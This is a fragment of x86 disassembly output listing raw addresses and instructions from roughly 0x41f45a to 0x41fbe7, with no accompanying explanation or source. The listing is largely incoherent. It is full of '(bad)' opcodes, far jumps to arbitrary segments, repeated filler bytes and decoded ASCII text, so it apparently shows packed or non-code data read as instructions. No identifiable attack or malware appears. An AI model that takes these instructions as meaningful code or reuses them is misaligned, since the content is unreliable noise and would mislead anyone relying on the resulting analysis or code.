  41f45a:	sub    DWORD PTR [ecx+ecx*2+0x6b0000a0],ecx
  41f461:	mov    al,ds:0x215d0000
  41f466:	add    BYTE PTR [eax],al
  41f468:	mov    esp,0x5633432c
  41f46d:	cdq    
  41f46e:	fist   WORD PTR [eax+ebx*2]
  41f471:	add    DWORD PTR [edi+0x25d4175a],ebx
  41f477:	dec    esp
  41f478:	sti    
  41f479:	jno    0x41f480
  41f47b:	dec    ecx
  41f47c:	add    eax,eax
  41f47e:	loop   0x41f442
  41f480:	add    BYTE PTR [eax],al
  41f482:	into   
  41f483:	stos   BYTE PTR es:[edi],al
  41f484:	out    dx,al
  41f485:	xchg   esi,eax
  41f486:	add    BYTE PTR [eax],al
  41f488:	add    BYTE PTR [ebx],al
  41f48a:	(bad)  
  41f48b:	sbb    BYTE PTR [edx],al
  41f48d:	out    0x54,eax
  41f48f:	imul   ebx,DWORD PTR [esi+0x3d252eb4],0x39
  41f496:	mov    cs,WORD PTR [ebx]
  41f498:	sbb    DWORD PTR [edx+0x34330930],0x12c8b9ce
  41f4a2:	call   0x8618:0xb8ac5829
  41f4a9:	mov    bl,0xde
  41f4ab:	aas    
  41f4ac:	add    BYTE PTR [eax],al
  41f4ae:	leave  
  41f4af:	dec    eax
	...
  41f4bc:	out    0x3a,al
  41f4be:	nop
  41f4bf:	(bad)  
  41f4c0:	(bad)  
  41f4c1:	(bad)  
  41f4c2:	(bad)  
  41f4c3:	(bad)  
  41f4c4:	(bad)  
  41f4c5:	(bad)  
  41f4c6:	(bad)  
  41f4c7:	(bad)  
  41f4c8:	(bad)  
  41f4c9:	dec    DWORD PTR [edi+0x69dc8cad]
  41f4cf:	jo     0x41f49e
  41f4d1:	int    0x22
  41f4d3:	into   
  41f4d4:	dec    edi
  41f4d5:	lock xchg esp,eax
  41f4d7:	pop    ebp
  41f4d8:	int    0x59
  41f4da:	adc    BYTE PTR [ebx+0x71271c31],ch
  41f4e0:	jo     0x41f4d4
  41f4e2:	(bad)  
  41f4e3:	(bad)  
  41f4e4:	fisttp QWORD PTR [eax+0x3dbce823]
  41f4ea:	xor    al,0x80
  41f4ec:	aaa    
  41f4ed:	retf   0x1416
  41f4f0:	jl     0x41f4a4
  41f4f2:	and    dh,BYTE PTR [ebp+edi*4-0x7b]
  41f4f6:	xor    al,0xae
  41f4f8:	xchg   esi,eax
  41f4f9:	es jg  0x41f574
  41f4fc:	cli    
  41f4fd:	fstp   st(1)
  41f4ff:	test   BYTE PTR [ecx+0x417fffff],0x4d
  41f506:	(bad)  
  41f507:	push   DWORD PTR [ecx]
  41f509:	mov    cl,0xa6
  41f50b:	push   DWORD PTR [ebp+0x60]
  41f50e:	test   dl,ah
  41f510:	scas   eax,DWORD PTR es:[edi]
  41f511:	lods   eax,DWORD PTR ds:[esi]
  41f512:	dec    edi
  41f513:	add    eax,0x6e71cdac
  41f518:	sbb    eax,0x10ce54db
  41f51d:	mov    ebx,0xd9415c0a
  41f522:	imul   esp,esi,0xffffff99
  41f525:	jne    0x41f59c
  41f527:	jne    0x41f5a5
  41f529:	int    0x75
  41f52b:	jne    0x41f56a
  41f52d:	out    0x75,al
  41f52f:	jne    0x41f5a6
	...
  41f539:	add    BYTE PTR [ebx-0x4f70ab69],dh
  41f53f:	bound  ebp,QWORD PTR [ecx+eax*4+0x33]
  41f543:	ins    DWORD PTR es:[edi],dx
  41f544:	or     al,0xdd
  41f546:	sbb    dl,BYTE PTR [ebp-0x66]
  41f549:	(bad)  
  41f54a:	pop    esp
  41f54b:	xor    dl,0x6f
  41f54e:	fimul  DWORD PTR [ecx]
  41f550:	ret    
  41f551:	mov    cl,0xe8
  41f553:	call   0xe92ade40
  41f558:	call   0x42de45
  41f55d:	daa    
  41f55e:	data16 mov bh,0x67
  41f561:	add    BYTE PTR [eax],al
  41f563:	push   ebx
  41f564:	sbb    dl,BYTE PTR [edi]
  41f566:	mov    eax,ds:0x543b905b
  41f56b:	xor    dl,cl
  41f56d:	sub    eax,0xf2bf529b
  41f572:	data16 arpl WORD PTR [eax+0x2723e326],bx
  41f579:	jmp    0x41f57c
  41f57b:	sbb    ecx,DWORD PTR [eax]
  41f57d:	xchg   BYTE PTR cs:[ecx-0x67],ch
  41f581:	sub    eax,0xfdbf3d82
  41f586:	and    BYTE PTR [eax],ah
  41f588:	bound  esp,QWORD PTR [eax]
  41f58a:	and    BYTE PTR [edx+0x4d],dl
  41f58d:	ins    DWORD PTR es:[edi],dx
  41f58e:	jo     0x41f5f5
  41f590:	and    BYTE PTR [edx],bh
  41f592:	and    ch,BYTE PTR gs:[esi]
  41f595:	inc    ebx
  41f596:	jb     0x41f5b8
  41f598:	jo     0x41f5c8
  41f59a:	outs   dx,BYTE PTR ds:[esi]
  41f59c:	and    BYTE PTR [ebp+0x65],ah
  41f59f:	outs   dx,DWORD PTR ds:[esi]
  41f5a0:	jbe    0x41f615
  41f5a2:	and    BYTE PTR ds:0x63536e0a,cl
  41f5a8:	jb     0x41f5b7
  41f5aa:	inc    esp
  41f5ab:	jb     0x41f61a
  41f5ad:	ins    BYTE PTR es:[edi],dx
  41f5ae:	and    BYTE PTR cs:[eax],ah
  41f5b1:	and    BYTE PTR [bx+si],ah
  41f5b4:	and    BYTE PTR gs:[ebx+0x50],dh
  41f5b8:	popa   
  41f5b9:	je     0x41f60e
  41f5bb:	jb     0x41f62c
  41f5bd:	je     0x41f602
  41f5bf:	gs je  0x41f5e2
  41f5c2:	gs jb  0x41f5e5
  41f5c5:	bound  esi,QWORD PTR [edx+0x65]
  41f5c8:	jbe    0x41f5ea
  41f5ca:	jo     0x41f641
  41f5cc:	inc    esp
  41f5cd:	and    BYTE PTR [esi+esi*2+0x74],al
  41f5d1:	and    BYTE PTR cs:[eax],ah
  41f5d4:	jb     0x41f64a
  41f5d6:	cmp    eax,0x6e6f6d6f
  41f5db:	je     0x41f5fd
  41f5dd:	inc    ecx
  41f5de:	and    BYTE PTR [ebx+0x43],ch
  41f5e1:	dec    ebp
  41f5e2:	gs jae 0x41f5ef
  41f5e5:	and    BYTE PTR [ebp+0x53],ah
  41f5e8:	and    BYTE PTR gs:[eax+0x3d],dh
  41f5ec:	arpl   WORD PTR [edx+0x2e],si
  41f5ef:	sub    BYTE PTR [ecx+0x6d],al
  41f5f2:	data16 gs jne 0x41f65b
  41f5f6:	arpl   WORD PTR [eax+eax*1+0x0],si
  41f5fa:	add    ebp,DWORD PTR [eax+eax*1+0x0]
  41f5fe:	pusha  
  41f5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f600:	add    BYTE PTR ds:[ebp-0x2d5ccb54],cl
  41f607:	dec    ebp
  41f608:	jae    0x41f61a
  41f60a:	push   edi
  41f60b:	retf   0x630
  41f60e:	rol    BYTE PTR [esi+0x9],0x20
  41f612:	adc    ch,BYTE PTR [ebp+0x6c]
  41f615:	push   edx
  41f616:	adc    BYTE PTR [eax],ah
  41f618:	push   ss
  41f619:	mov    al,ds:0x8d8d8d46
  41f61e:	aad    0xd8
  41f620:	mov    dh,0x17
  41f622:	push   0x6e1cefe
  41f627:	repnz xchg esp,eax
  41f629:	mov    esp,0xe10ffe3e
  41f62e:	pop    ds
  41f62f:	cmp    cl,al
  41f631:	xchg   ecx,eax
  41f632:	pop    edx
  41f633:	push   0x70
  41f635:	dec    esi
  41f636:	inc    edx
  41f637:	dec    esp
  41f638:	addr16 xchg edi,eax
  41f63a:	fisttp QWORD PTR [ebp+0x7b9ed58d]
  41f640:	lea    ecx,[ebp+0x7474748d]
  41f646:	je     0x41f6bc
  41f648:	je     0x41f6be
  41f64a:	je     0x41f6c0
  41f64c:	sar    BYTE PTR [eax],1
  41f64e:	mov    WORD PTR [eax],es
	...
  41f658:	add    BYTE PTR [eax],al
  41f65a:	cmp    eax,0x4d00ee8f
  41f65f:	ret    
  41f660:	cmp    edx,DWORD PTR [ebp+edi*8-0x10]
  41f664:	add    DWORD PTR [ecx-0x22],ebx
  41f667:	sbb    eax,0x17761c70
  41f66c:	cmp    cl,BYTE PTR [eax+0x58826447]
  41f672:	add    BYTE PTR [eax],al
  41f674:	mov    ah,bl
  41f676:	add    BYTE PTR [eax],al
  41f678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f679:	inc    ecx
  41f67a:	add    BYTE PTR [eax],al
  41f67c:	sub    al,0xbe
  41f67e:	jg     0x41f6fe
  41f680:	std    
  41f681:	ret    0xcc7f
  41f684:	mov    esi,0xa443c6d3
  41f689:	mov    edx,0xb3afdd00
  41f68e:	jle    0x41f6ea
  41f690:	in     eax,dx
  41f691:	test   BYTE PTR ds:0x5bff00e6,dl
  41f697:	mov    ds:0xffffe35f,eax
  41f69c:	push   DWORD PTR [ebp+0x7ceaad61]
  41f6a2:	mov    esp,0x5f7ff7a6
  41f6a7:	jo     0x41f6b9
  41f6a9:	retf   
  41f6aa:	fimul  WORD PTR [edx+eax*2]
  41f6ad:	and    eax,0x9d13e8dd
  41f6b2:	sbb    esp,eax
  41f6b4:	test   eax,0x676112cd
  41f6b9:	popf   
  41f6ba:	mov    ah,BYTE PTR ds:[edi]
  41f6bd:	ss fwait
  41f6bf:	or     bh,bh
  41f6c1:	jmp    FWORD PTR [esi]
  41f6c3:	ud0    edi,edi
  41f6c6:	inc    DWORD PTR [eax]
	...
  41f6d0:	sub    al,0x79
  41f6d2:	add    BYTE PTR ds:[eax],al
  41f6d5:	add    BYTE PTR [eax],al
  41f6d7:	add    BYTE PTR [eax],al
  41f6d9:	add    BYTE PTR [eax],al
  41f6db:	add    bh,bh
  41f6dd:	inc    DWORD PTR [edx+0x47]
  41f6e0:	inc    edx
  41f6e1:	and    al,0x4d
  41f6e3:	xchg   ecx,eax
  41f6e4:	add    eax,0x668522ff
  41f6e9:	mov    ecx,0xecdcc062
  41f6ee:	push   edi
  41f6ef:	xchg   edx,eax
  41f6f0:	loopne 0x41f73f
  41f6f2:	jmp    0x41f70d
  41f6f4:	ds icebp 
  41f6f6:	(bad)  
  41f6f7:	dec    DWORD PTR [ebp-0x259cd5c0]
  41f6fd:	mov    ah,0x6f
  41f6ff:	retf   0x6e07
  41f702:	(bad)  
  41f703:	je     0x41f784
  41f705:	sbb    eax,DWORD PTR ss:[edx]
  41f708:	mov    ecx,0xe8792cf7
  41f70d:	cmp    BYTE PTR [ecx+edi*1],cl
  41f710:	pop    ds
  41f711:	push   es
  41f712:	jle    0x41f73c
  41f714:	imul   edi,edi,0x74af45ff
  41f71a:	(bad)  
  41f71b:	dec    ecx
  41f71d:	mov    ds:0x67ffff77,al
  41f722:	je     0x41f75d
  41f724:	jb     0x41f6d6
  41f726:	jmp    0xd2c1:0xc7696189
  41f72d:	adc    DWORD PTR [edx],0xffffffa6
  41f730:	out    dx,eax
  41f731:	lods   al,BYTE PTR ds:[esi]
  41f732:	das    
  41f733:	or     al,BYTE PTR [esi-0x6a]
  41f736:	add    al,0xd7
  41f738:	jne    0x41f739
  41f73a:	(bad)  
  41f73b:	call   FWORD PTR [eax-0x3d]
  41f73e:	(bad)  
  41f73f:	call   ecx
  41f741:	jno    0x41f742
  41f743:	(bad)  
  41f744:	inc    DWORD PTR [eax]
	...
  41f74e:	rcr    BYTE PTR [ecx-0x636d183],0x8d
  41f755:	add    al,BYTE PTR [ebx]
  41f757:	shl    BYTE PTR [edx+ebp*8-0x4c],cl
  41f75b:	xchg   edi,eax
  41f75c:	push   esi
  41f75d:	fcos   
  41f75f:	(bad)  
  41f760:	in     eax,dx
  41f761:	add    ebp,DWORD PTR gs:[ecx-0x63b8]
  41f768:	(bad)  
  41f769:	(bad)  
  41f76a:	(bad)  
  41f76b:	(bad)  
  41f76c:	(bad)  
  41f76d:	(bad)  
  41f76e:	dec    esp
  41f770:	int3   
  41f771:	sub    BYTE PTR [eax+ecx*8],bl
  41f774:	fmulp  st(4),st
  41f776:	int3   
  41f777:	pushf  
  41f778:	xor    edi,DWORD PTR [edi+esi*2+0x75e1bdb2]
  41f77f:	ret    0x4ed5
  41f782:	or     ch,bh
  41f784:	shl    ch,0x43
  41f787:	xchg   ecx,eax
  41f788:	pop    ebx
  41f789:	(bad)  
  41f78a:	ja     0x41f740
  41f78c:	repnz repnz not DWORD PTR [eax]
  41f790:	mov    ecx,0x46d9356c
  41f795:	mov    WORD PTR [esi-0x335aa63f],es
  41f79b:	int3   
  41f79c:	mov    edx,ss
  41f79e:	int3   
  41f79f:	int3   
  41f7a0:	fld    QWORD PTR [esi+0x3708cc77]
  41f7a6:	xchg   edx,eax
  41f7a7:	and    dl,dh
  41f7a9:	clc    
  41f7aa:	xchg   ecx,eax
  41f7ab:	std    
  41f7ac:	lods   al,BYTE PTR ds:[esi]
  41f7ad:	lea    ebx,[edi-0xa9f1302]
  41f7b3:	retf   
  41f7b4:	push   edx
  41f7b5:	dec    ecx
  41f7b6:	ins    DWORD PTR es:[edi],dx
  41f7b7:	stos   DWORD PTR es:[edi],eax
  41f7b8:	rcr    DWORD PTR [esp+edx*1-0xc],cl
  41f7bc:	mov    cs,WORD PTR [eax]
  41f7be:	or     BYTE PTR [eax],cl
  41f7c0:	xor    BYTE PTR [edx],dl
  41f7c2:	push   ebx
  41f7c3:	dec    ebp
  41f7c4:	mov    ebp,0x389e8c85
  41f7c9:	xchg   ebx,eax
  41f7ca:	(bad)  
  41f7cc:	ret    0x2975
  41f7cf:	dec    ebx
  41f7d0:	push   edx
  41f7d1:	mov    WORD PTR [edi+0x7204f6d],?
  41f7d7:	mov    dh,0xb1
  41f7d9:	adc    eax,0x83a31e7
  41f7de:	or     BYTE PTR [eax],cl
  41f7e0:	dec    edx
  41f7e1:	inc    esp
  41f7e2:	or     BYTE PTR [eax],cl
  41f7e4:	or     BYTE PTR [ebp+0x75],dh
  41f7e7:	jne    0x41f85e
  41f7e9:	jne    0x41f860
  41f7eb:	jne    0x41f862
  41f7ed:	jne    0x41f7f5
  41f7ef:	out    dx,al
  41f7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7f1:	add    al,0x4
  41f7f3:	add    al,0x4
  41f7f5:	add    al,0x4
  41f7f7:	add    al,0x4
  41f7f9:	add    al,0x0
  41f7fb:	add    dh,cl
  41f7fd:	ret    
  41f7fe:	lea    ebx,[esi-0x48]
  41f801:	call   0x7d453e79
  41f806:	xor    ebx,DWORD PTR [edx*1+0x59027ada]
  41f80d:	add    bh,ah
  41f80f:	sbb    ebx,0x34
  41f812:	adc    eax,esi
  41f814:	add    BYTE PTR [eax],al
  41f816:	adc    al,0x52
  41f818:	add    BYTE PTR [eax],al
  41f81a:	push   cs
  41f81b:	int    0x0
  41f81d:	add    BYTE PTR [ebx+ecx*4-0x4fbc21e2],bh
  41f824:	pop    eax
  41f825:	mov    esi,0xe0d47a3c
  41f82a:	ins    BYTE PTR es:[edi],dx
  41f82b:	xor    esp,0xc2d9df84
  41f831:	enter  0x45a4,0xeb
  41f835:	or     eax,DWORD PTR [eax]
  41f837:	add    ah,ah
  41f839:	sbb    DWORD PTR [edi],esp
  41f83b:	ins    BYTE PTR es:[edi],dx
  41f83c:	add    BYTE PTR [eax],al
  41f83e:	add    BYTE PTR [edx-0x26c1205d],dl
  41f844:	pop    edi
  41f845:	push   esi
  41f846:	cmp    al,0x27
  41f849:	test   DWORD PTR ds:[eax+0x5c],eax
  41f84d:	ret    0xa0cb
  41f850:	push   ebp
  41f851:	adc    al,0x8b
  41f853:	jmp    0xe4cd:0x7d38ce35
  41f85a:	jecxz  0x41f85e
  41f85c:	sub    ebp,DWORD PTR [ebp-0x78]
  41f85f:	in     al,dx
  41f860:	ror    DWORD PTR [esi],1
  41f862:	add    BYTE PTR [eax],al
  41f864:	retfw  0x0
	...
  41f870:	add    BYTE PTR [eax],al
  41f872:	retf   
  41f873:	stc    
  41f874:	push   ds
	...
  41f87d:	add    ah,cl
  41f87f:	int3   
  41f880:	fdiv   QWORD PTR [ebx+0x66684e27]
  41f886:	aam    0x7e
  41f888:	inc    eax
  41f889:	jns    0x41f818
  41f88b:	ins    BYTE PTR es:[edi],dx
  41f88c:	retf   0x9dd4
  41f88f:	xchg   esp,eax
  41f890:	sbb    BYTE PTR [ebp-0x612cc9df],ch
  41f896:	cs hlt 
  41f898:	int3   
  41f899:	int3   
  41f89a:	sbb    al,0x1b
  41f89c:	maxps  xmm1,XMMWORD PTR [ebx+0x3917867f]
  41f8a3:	mov    al,ds:0xb3073096
  41f8a8:	pop    eax
  41f8a9:	dec    edx
  41f8aa:	(bad)  
  41f8ab:	jns    0x41f8f3
  41f8ad:	and    al,0xe6
  41f8af:	adc    ebp,esp
  41f8b1:	mov    DWORD PTR [ebx-0xc53e7d6],ebx
  41f8b7:	int3   
  41f8b8:	int3   
  41f8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ba:	mov    edx,0xeecccc83
  41f8bf:	repz mov ah,cl
  41f8c2:	xor    edi,DWORD PTR [eax-0x23]
  41f8c5:	adc    BYTE PTR [esi],cl
  41f8c7:	fild   DWORD PTR [eax-0x5a]
  41f8ca:	jae    0x41f84f
  41f8cc:	push   0x77
  41f8ce:	cmp    DWORD PTR [ecx+0x76],edx
  41f8d1:	stos   DWORD PTR es:[edi],eax
  41f8d2:	jns    0x41f892
  41f8d4:	call   0x6dcf:0x68c845d3
  41f8db:	xor    esi,DWORD PTR [ebx]
  41f8dd:	xor    ecx,DWORD PTR [ecx-0x60]
  41f8e0:	xor    esi,DWORD PTR [ebx]
  41f8e2:	jl     0x41f918
  41f8e4:	xor    esi,DWORD PTR [ebx]
  41f8e6:	xor    edi,edi
  41f8e8:	(bad)  
  41f8e9:	(bad)  
  41f8ea:	(bad)  
  41f8eb:	(bad)  
  41f8ec:	(bad)  
  41f8ed:	(bad)  
  41f8ee:	(bad)  
  41f8ef:	call   FWORD PTR [ecx]
  41f8f1:	pop    esp
  41f8f2:	adc    esi,DWORD PTR [edx-0xd]
  41f8f5:	(bad)  
  41f8f7:	shr    DWORD PTR [ebp-0x6e],0x82
  41f8fb:	test   al,0x35
  41f8fd:	in     eax,dx
  41f8fe:	ins    BYTE PTR es:[edi],dx
  41f8ff:	push   ebp
  41f900:	mov    ch,0x2f
  41f902:	pop    ebx
  41f903:	cmp    edx,DWORD PTR [esi-0x38]
  41f906:	jmp    0x41f8c7
	...
  41f910:	add    bh,bh
  41f912:	(bad)  
  41f913:	jmp    0xd0ff:0xff263f03
  41f91a:	or     al,0x64
  41f91c:	dec    esp
  41f91d:	out    dx,eax
  41f91e:	push   ds
  41f91f:	(bad)  
  41f921:	and    dh,BYTE PTR [edx-0x70]
  41f924:	mov    ecx,0xfda45a76
  41f929:	adc    BYTE PTR [edi+0x28],0x8c
  41f92d:	dec    eax
  41f92e:	mov    al,0xb7
  41f930:	call   0x389c7101
  41f935:	push   0xffffffb2
  41f937:	std    
  41f938:	cld    
  41f939:	loope  0x41f952
  41f93b:	mov    bh,0xff
  41f93d:	push   DWORD PTR [edx]
  41f93f:	(bad)  
  41f940:	(bad)  
  41f941:	call   FWORD PTR [edx+0x79]
  41f944:	js     0x41f945
  41f946:	add    BYTE PTR ds:0x8e71c8cf,bl
  41f94c:	into   
  41f94d:	mov    ds:0x76d75d48,eax
  41f952:	outs   dx,BYTE PTR ds:[esi]
  41f953:	arpl   WORD PTR [ebp+0x72],cx
  41f956:	sub    BYTE PTR [esi],bh
  41f958:	ins    DWORD PTR es:[edi],dx
  41f959:	arpl   WORD PTR gs:[edx+0x63],sp
  41f95d:	bound  esp,QWORD PTR [ebx+0x3d]
  41f960:	and    BYTE PTR [ecx+0x6d],ah
  41f963:	and    BYTE PTR [edx+ecx*1],bh
  41f966:	gs jbe 0x41f9df
  41f969:	gs inc esp
  41f96b:	and    BYTE PTR gs:[ebx+0x20],dh
  41f96f:	ins    DWORD PTR es:[edi],dx
  41f970:	inc    esp
  41f971:	jb     0x41f993
  41f973:	ins    DWORD PTR es:[edi],dx
  41f974:	dec    ebp
  41f975:	or     ah,BYTE PTR [eax]
  41f977:	imul   ebp,DWORD PTR [ebp+0x2e],0x636d6576
  41f97e:	gs dec ebp
  41f980:	bound  esp,QWORD PTR [ebp+0x22]
  41f983:	outs   dx,DWORD PTR ds:[esi]
  41f984:	ins    DWORD PTR es:[edi],dx
  41f985:	gs ins BYTE PTR es:[edi],dx
  41f987:	ins    DWORD PTR es:[edi],dx
  41f988:	cmp    eax,0x6e73206e
  41f98d:	ins    DWORD PTR es:[edi],dx
  41f98e:	push   ebx
  41f98f:	ins    BYTE PTR es:[edi],dx
  41f990:	arpl   WORD PTR gs:[esp+esi*2+0x6d],si
  41f995:	gs xchg ebp,eax
  41f997:	les    eax,FWORD PTR [ecx]
  41f999:	retf   
  41f99a:	add    DWORD PTR [bp+di],eax
  41f99d:	jne    0x41f93e
  41f99f:	xor    DWORD PTR ds:0x714eda,esi
  41f9a5:	add    BYTE PTR [eax],al
  41f9a7:	cdq    
  41f9a8:	cmp    DWORD PTR [edi],esi
  41f9aa:	(bad)  
  41f9ab:	xor    DWORD PTR [esi+0x21ccffbe],ebx
  41f9b1:	fdivr  st,st(7)
  41f9b3:	sub    al,0x33
  41f9b5:	loopne 0x41f938
  41f9b7:	les    esp,FWORD PTR [esi-0x4]
  41f9ba:	mov    bl,0xbf
  41f9bc:	aaa    
  41f9bd:	mov    dh,0x92
  41f9bf:	or     DWORD PTR [ebx+edx*4],ebp
  41f9c2:	jmp    0x1241f9ed
  41f9c7:	fdiv   st(0),st
	...
  41f9d5:	retf   
  41f9d6:	dec    ebp
  41f9d7:	cmp    al,0x8
  41f9d9:	or     BYTE PTR [eax],cl
  41f9db:	or     BYTE PTR [eax],cl
  41f9dd:	or     BYTE PTR [eax],cl
  41f9df:	or     BYTE PTR [eax],cl
  41f9e1:	jne    0x41fa58
  41f9e3:	xor    eax,0x4a868931
  41f9e8:	inc    esi
  41f9e9:	adc    eax,0x75bce55e
  41f9ee:	inc    edx
  41f9ef:	ins    DWORD PTR es:[edi],dx
  41f9f0:	cs mov edi,0x5fb4ce47
  41f9f6:	sbb    eax,0xa784ba1e
  41f9fb:	jne    0x41fa72
  41f9fd:	xchg   DWORD PTR [ebx-0x6a828a8b],edi
  41fa03:	jne    0x41fa7a
  41fa05:	pusha  
  41fa06:	jge    0x41f9f2
  41fa08:	push   0xbcba2c1a
  41fa0d:	xchg   DWORD PTR [edi+0x1506051e],edi
  41fa13:	imul   esp,DWORD PTR [esi+0x355ca2dc],0x46eaf9aa
  41fa1d:	jne    0x41fa94
  41fa1f:	mov    gs,WORD PTR [ecx]
  41fa21:	loope  0x41fa15
  41fa23:	jne    0x41fa9a
  41fa25:	jne    0x41f9e8
  41fa27:	in     eax,0xa1
  41fa29:	dec    esi
  41fa2a:	or     DWORD PTR [edx],eax
  41fa2c:	stos   DWORD PTR es:[edi],eax
  41fa2d:	add    edi,ebp
  41fa2f:	jbe    0x41fa3f
  41fa31:	sub    eax,0x70524875
  41fa36:	add    bh,BYTE PTR [edi-0x68]
  41fa39:	gs jl  0x41fa2c
  41fa3c:	iret   
  41fa3d:	mov    al,0xcb
  41fa3f:	out    dx,eax
  41fa40:	mov    dl,0xb6
  41fa42:	test   eax,0x67392ba6
  41fa47:	daa    
  41fa48:	jbe    0x41fabf
  41fa4a:	jne    0x41faa0
  41fa4c:	jns    0x41fac3
  41fa4e:	jne    0x41fac5
  41fa50:	xor    esi,DWORD PTR [ebx]
  41fa52:	xor    esi,DWORD PTR [ebx]
  41fa54:	xor    esi,DWORD PTR [ebx]
  41fa56:	xor    esi,DWORD PTR [ebx]
  41fa58:	xor    esp,DWORD PTR [ecx-0xee50]
  41fa5e:	(bad)  
  41fa5f:	(bad)  
  41fa60:	(bad)  
  41fa61:	(bad)  
  41fa62:	(bad)  
  41fa63:	(bad)  
  41fa64:	inc    DWORD PTR [eax]
  41fa66:	add    BYTE PTR [edx+0x0],cl
  41fa69:	adc    esi,edx
  41fa6b:	add    DWORD PTR [ecx-0x76efd3c3],0x9029af17
  41fa75:	iret   
  41fa76:	mov    eax,0x7ee2ebb1
  41fa7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa7c:	inc    eax
  41fa7d:	mov    ds:0x8000004,eax
  41fa82:	cmp    DWORD PTR [ebp-0xcf36ba4],ecx
  41fa88:	clc    
  41fa89:	mov    ds:0x786d5671,eax
  41fa8e:	call   0xd56f:0xd9804ffc
  41fa95:	mov    edi,0xca6b0ee3
  41fa9a:	xor    DWORD PTR [edi+ebx*4],esi
  41fa9d:	sub    al,0x0
  41fa9f:	add    BYTE PTR [eax],cl
  41faa1:	cmp    eax,0xcc0000f1
  41faa6:	(bad)  
  41faa7:	dec    edx
  41faa8:	add    BYTE PTR [eax],al
  41faaa:	push   ebp
  41faab:	xlat   BYTE PTR ds:[ebx]
  41faac:	sbb    eax,0x2a1e41db
  41fab1:	or     edx,DWORD PTR [ebp+0x7c]
  41fab4:	add    DWORD PTR [ebx+0x7f632a6f],0xf93173f9
  41fabe:	mov    esi,0x23c39f
  41fac3:	add    BYTE PTR [eax],al
  41fac5:	sbb    DWORD PTR [edi+0x615b0000],ebx
	...
  41fad7:	cmp    edi,DWORD PTR [edx+0x63]
  41fada:	push   ebp
  41fadb:	pop    edx
  41fadc:	mov    bl,0xd7
  41fade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fadf:	sar    DWORD PTR [edx-0x1fa38779],0xe0
  41fae6:	aaa    
  41fae7:	mov    edx,0x5f7b8c6a
  41faec:	dec    esp
  41faed:	dec    edi
  41faee:	and    eax,0x0
  41faf3:	add    BYTE PTR [eax],al
  41faf5:	add    BYTE PTR [eax],al
  41faf7:	add    BYTE PTR [eax],al
  41faf9:	add    BYTE PTR [ecx-0x6f],cl
  41fafc:	dec    BYTE PTR [eax+eax*1+0x4bcf5f00]
  41fb03:	jno    0x41fafd
  41fb05:	jle    0x41fb6a
  41fb07:	in     al,0x68
  41fb09:	push   edi
  41fb0a:	jge    0x41fafa
  41fb0c:	dec    ebp
  41fb0d:	sbb    DWORD PTR [ebx-0x7ae3fe4b],edx
  41fb13:	loope  0x41faf8
  41fb15:	xchg   BYTE PTR [ebp-0x229066ed],ah
  41fb1b:	in     al,0x79
  41fb1d:	cs mov eax,0x66da9dbb
  41fb23:	add    BYTE PTR [eax],al
  41fb25:	adc    BYTE PTR [eax+eax*1],cl
  41fb28:	add    BYTE PTR [ecx],cl
  41fb2a:	test   DWORD PTR [ebx+0x0],edi
  41fb2d:	add    BYTE PTR [ebp-0x43],dh
  41fb30:	mov    ebp,0x9b17a99f
  41fb35:	jmp    0x15ba0354
  41fb3a:	ins    BYTE PTR es:[edi],dx
  41fb3b:	inc    ecx
  41fb3c:	int    0xbf
  41fb3e:	and    dl,bl
  41fb40:	ret    
  41fb41:	push   0x4ffe7bb3
  41fb46:	add    BYTE PTR [eax],al
  41fb48:	add    BYTE PTR [ebx-0x20fb2bba],bl
  41fb4e:	out    0xeb,eax
  41fb50:	sti    
  41fb51:	mov    al,0xf6
  41fb53:	xchg   esp,eax
  41fb54:	adc    bl,BYTE PTR [esi]
  41fb56:	pop    edx
  41fb57:	fsub   QWORD PTR [eax-0x36]
  41fb5a:	not    DWORD PTR [ebp+0x5453ca78]
  41fb60:	in     eax,0xa2
  41fb62:	jp     0x41fbb6
  41fb64:	jg     0x41fb40
  41fb66:	add    BYTE PTR [eax],al
  41fb68:	pop    eax
  41fb69:	lahf   
  41fb6a:	jl     0x41fb6c
  41fb6c:	add    BYTE PTR [eax],al
  41fb6e:	add    al,0x4
  41fb70:	add    al,0x4
  41fb72:	add    al,0x4
  41fb74:	add    al,0x4
  41fb76:	add    al,0x83
  41fb78:	test   ebp,ecx
	...
  41fb82:	add    bh,bh
  41fb84:	call   DWORD PTR [edi+0x2e]
  41fb87:	stos   DWORD PTR es:[edi],eax
  41fb88:	add    BYTE PTR [ebp-0xe],ch
  41fb8b:	dec    ecx
  41fb8c:	imul   esp,DWORD PTR ds:[ebx+0x65],0x69656563
  41fb94:	push   edx
  41fb95:	jae    0x41fbe4
  41fb97:	sub    DWORD PTR [ebx+0x65],esi
  41fb9a:	je     0x41fc09
  41fb9c:	cmp    al,0x64
  41fb9e:	push   edx
  41fb9f:	cs push ebx
  41fba1:	ins    DWORD PTR es:[edi],dx
  41fba2:	gs push edi
  41fba4:	popa   
  41fba5:	bound  esi,QWORD PTR [edi+ebp*2+0x3e]
  41fba9:	imul   esi,DWORD PTR [ebp+0x63],0x3d206565
  41fbb0:	jbe    0x41fc17
  41fbb2:	outs   dx,BYTE PTR ds:[esi]
  41fbb3:	inc    ebx
  41fbb4:	outs   dx,BYTE PTR ds:[esi]
  41fbb5:	outs   dx,BYTE PTR ds:[esi]
  41fbb6:	jo     0x41fc1d
  41fbb8:	jb     0x41fc29
  41fbba:	and    BYTE PTR [ebp+0x65],ch
  41fbbd:	jb     0x41fbc9
  41fbbf:	das    
  41fbc0:	ds cs jbe 0x41fc02
  41fbc4:	mov    fs,WORD PTR [esi+0x45]
  41fbc7:	pop    ss
  41fbc8:	cdq    
  41fbc9:	pop    esi
  41fbca:	mov    BYTE PTR [edx+0x2c],ch
  41fbcd:	int3   
  41fbce:	std    
  41fbcf:	xchg   esi,eax
  41fbd0:	xchg   DWORD PTR [eax+0x22],ebp
  41fbd3:	add    edi,DWORD PTR [edi+0x7f]
  41fbd6:	(bad)  
  41fbd7:	jmp    DWORD PTR [ebx+0x26ffff1e]
  41fbdd:	pop    ss
  41fbde:	(bad)  
  41fbdf:	push   edx
  41fbe1:	fnstenv [edi]
  41fbe3:	xor    BYTE PTR [ebx+edx*8],al
  41fbe6:	cli    
  41fbe7:	sbb    BYTE PTR [ebp+0x4e],ch
